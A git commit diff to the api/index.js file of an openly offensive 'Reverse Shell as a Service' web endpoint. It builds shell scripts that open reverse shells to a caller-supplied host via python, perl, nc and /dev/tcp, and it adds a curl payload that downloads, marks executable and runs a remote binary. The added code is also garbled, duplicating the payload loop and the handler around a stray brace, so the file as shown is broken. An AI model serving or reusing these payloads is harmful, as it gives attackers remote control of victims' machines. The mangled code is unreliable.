fe0ea77da077fb69616777562bf695dc2b38f320
Blake Balick-Schreiber <blake.balick.schreiber@gmail.com>
2024-09-26 20:02:49 -0400

    Update index.js
    Changed to work with express

--- api/index.js
+++ api/index.js
@@ -12,41 +12,66 @@ const usage = `# Reverse Shell as a Service
 # 3. Don't be a dick`;
 
 const reverseShell = (address = '') => {
-	const [host, port] = address.split(':');
-	if (!host || !port) {
-		return usage;
-	}
+        const [host, port] = address.split(':');
+        if (!host || !port) {
+                return usage;
+        }
+        console.log(`Host is: ${host}:${port}`);
 
-	const payloads = {
-		openssl: `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${host}:${port} > /tmp/s; rm /tmp/s`,
-		python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
-		perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
-		nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
-		sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`
-	};
+        const payloads = {
+                curl: `curl https://${host} --output /tmp/bazel | chmod +x /tmp/bazel | /tmp/bazel`,
+                python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
+                perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
+                nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
+                sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`
+  };
 
-	return Object.entries(payloads).reduce((script, [cmd, payload]) => {
-		script += `
+        return Object.entries(payloads).reduce((script, [cmd, payload]) => {
+                script += `
 
 if command -v ${cmd} > /dev/null 2>&1; then
-	${payload}
-	exit;
+        ${payload}
+        exit;
 fi`;
 
-		return script;
-	}, usage);
+                return script;
+        }, usage);
 };
 
 const handler = (request, response) => {
-	const { address } = request.query;
+        const  address = request.query.address;
+        console.log(address);
 
-	const one_month = 60 * 60 * 24 * 30;
+        const one_month = 60 * 60 * 24 * 30;
 
-	response.setHeader('Content-Type', 'text/plain');
-	response.setHeader('Cache-Control', `s-maxage=${one_month}`); // Cache at edge
-	response.send(reverseShell(address));
+        response.setHeader('Content-Type', 'text/plain');
+        response.setHeader('Cache-Control', `s-maxage=${one_month}`); // Cache at edge
+                };
+
+        return Object.entries(payloads).reduce((script, [cmd, payload]) => {
+                script += `
+
+if command -v ${cmd} > /dev/null 2>&1; then
+        ${payload}
+        exit;
+fi`;
+
+                return script;
+        }, usage);
+};
+
+const handler = (request, response) => {
+        const  address = request.query.address;
+        console.log(address);
+
+        const one_month = 60 * 60 * 24 * 30;
+
+        response.setHeader('Content-Type', 'text/plain');
+        response.setHeader('Cache-Control', `s-maxage=${one_month}`); // Cache at edge
+        response.send(reverseShell(address));
 };
 
 module.exports = handler;
 
 module.exports.reverseShell = reverseShell;
+ 
